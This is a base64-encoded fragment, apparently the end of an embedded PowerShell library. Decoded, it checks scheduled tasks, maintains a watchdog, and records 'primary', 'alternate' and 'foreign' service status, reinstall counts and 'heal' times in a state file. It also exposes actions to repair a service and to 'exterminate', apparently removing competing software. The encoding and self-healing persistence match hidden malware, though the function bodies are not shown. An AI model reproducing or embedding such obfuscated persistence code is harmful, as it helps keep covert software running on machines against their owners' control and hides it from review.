a3NUb3RhbCsrDQogICAgICAgICYgc2NodGFza3MuZXhlIC9RdWVyeSAvVE4gJGlkWyRrXSAyPiYx
IHwgT3V0LU51bGwNCiAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJHRhc2tzT2sr
KyB9DQogICAgfQ0KICAgICR3ZCA9IEVuc3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0gQHt9DQog
ICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAgICBpZiAo
VGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsNCiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRl
cmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9w
ZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBj
YXRjaCB7fQ0KICAgIH0NCiAgICAkaW5zdGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJldi5pbnN0
YWxsQ291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0NCiAg
ICBpZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5kICRwcmlt
IC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0NCiAgICAkc3RhdGUgPSBbb3JkZXJl
ZF1Aew0KICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQ0KICAgICAgICB0
cyAgICAgICAgICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykN
CiAgICAgICAgYnVpbGQgICAgICAgID0gJEJ1aWxkDQogICAgICAgIHByaW0gICAgICAgICA9ICQo
aWYgKCRwcmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBhbHQgICAg
ICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pDQogICAgICAg
IGZvcmVpZ24gICAgICA9ICRmb3JlaWduDQogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09r
DQogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsDQogICAgICAgIHdhdGNoZG9nICAg
ICA9ICR3ZA0KICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50DQogICAgICAgIGxh
c3RIZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgp
LlRvU3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFs
IH0gZWxzZSB7ICRudWxsIH0pDQogICAgICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQ0KICAgIH0N
CiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQ0KICAgIHJldHVybiAkc3RhdGUNCn0NCg0Kc3dp
dGNoICgkQWN0aW9uKSB7DQogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXpl
LUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5L
ZXkpPSQoJF8uVmFsdWUpIiB9IH0NCiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQt
SWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktl
eSk9JCgkXy5WYWx1ZSkiIH0gfQ0KICAgICd3YXRjaGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRj
aGRvZyB8IE91dC1OdWxsIH0NCiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRv
ZyB9DQogICAgJ3N0YXRlJyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0VG8tSnNv
biAtQ29tcHJlc3MgfQ0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAk
RnAgfQ0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRlIH0NCn0NCg==
::B64_LIB_END